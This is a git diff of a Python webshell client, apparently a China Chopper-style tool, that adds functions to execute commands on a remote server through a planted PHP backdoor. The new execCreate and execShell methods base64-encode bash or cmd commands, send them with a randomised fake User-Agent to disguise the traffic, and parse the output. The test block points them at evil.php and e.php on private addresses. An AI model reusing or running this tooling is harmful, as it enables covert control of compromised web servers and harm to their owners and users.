@@ -1,10 +1,11 @@
 import requests
-from nife.core.phpCodeFun import getFilelistBase, getFilePathBase, getFile, deleteFile, uploadFile, changeName, createFile, createDir
+from nife.core.phpCodeFun import *
 from nife.core.fakeUseAgent import fake_agent
 import json
 import os
 from django.conf import settings
 from lxml import etree
+import base64
 os.environ.setdefault("DJANGO_SETTINGS_MODULE", "WCnife.settings")
 
 class SendCode(object):
@@ -152,14 +153,59 @@ class SendCode(object):
         val = page.xpath('//ek/text()')[0]
         return val
 
+    def execCreate(self):
+        """
+        创建shell
+        :return:网站目录和操作系统
+        """
+        self.data['ek'] = execShellCreate()
+        header = {
+            "User-Agent": fake_agent()
+        }
+        res = self.r.post(url=self.url, data=self.data, headers=header)
+        page = etree.HTML(res.text)
+        val = page.xpath('//ek/text()')[0]
+        val = val.split('\t')
+        # 0 windows 1 linux
+        ops = 0
+        if 'linux' in val[2].lower():
+                ops = 1
+        return val[0], ops
+
+    def execShell(self, cmd, options):
+        """
+        执行命令
+        :param cmd:
+        :param options:
+        :return:
+        """
+        cmd = base64.b64encode(cmd.encode("UTF-8")).decode("UTF-8")
+        options = base64.b64encode(options.encode("UTF-8")).decode("UTF-8")
+        self.data['ek'] = execShell(cmd=cmd, options=options)
+        header = {
+            "User-Agent": fake_agent()
+        }
+        res = self.r.post(url=self.url, data=self.data, headers=header)
+        res.encoding = res.apparent_encoding
+        res = res.text.replace('->|', '')
+        res = res.split('|<-')
+        # page = etree.HTML(res.text)
+        # val = str(page.xpath('//ek/text()')[0])
+        splitres = res[0].split("[S]")
+        cmdres = splitres[0]
+        newdir = splitres[1].replace('[E]', '').strip()
+        return cmdres, newdir
 
 
 if __name__ == '__main__':
     # s = SendCode("http://172.28.100.13/PhpstormProjects/Cnife/eval_fun.php", 'cmd')
     # s = SendCode("http://172.28.100.84/evil.php", 'cmd')
     # path = s.deleteFile("C:/Users/elloit/Desktop/php/PHPTutorial/WWW/121/")
-    # print(path)s = SendCode("http://172.28.100.84/evil.php", 'cmd')
+    # s = SendCode("http://172.28.100.84/evil.php", 'cmd')
     s = SendCode("http://172.28.100.85:8080/e.php", 'cmd')
-    path = s.createDir(path='/var/www/html/asdadasd/888/')
+    # path = s.createDir(path='/var/www/html/asdadasd/888/')
+    # path = s.execCreate()
+    path = s.execShell("/bin/bash", 'cd "/var/www/html/";cd ..;echo [S];pwd;echo [E]')
+    # path = s.execShell("cmd", r'cd/d"c:\Users\elloit\Desktop\php\PHPTutorial\WWW\"&dir&echo [S]&cd&echo [E]')
     print(path)
 
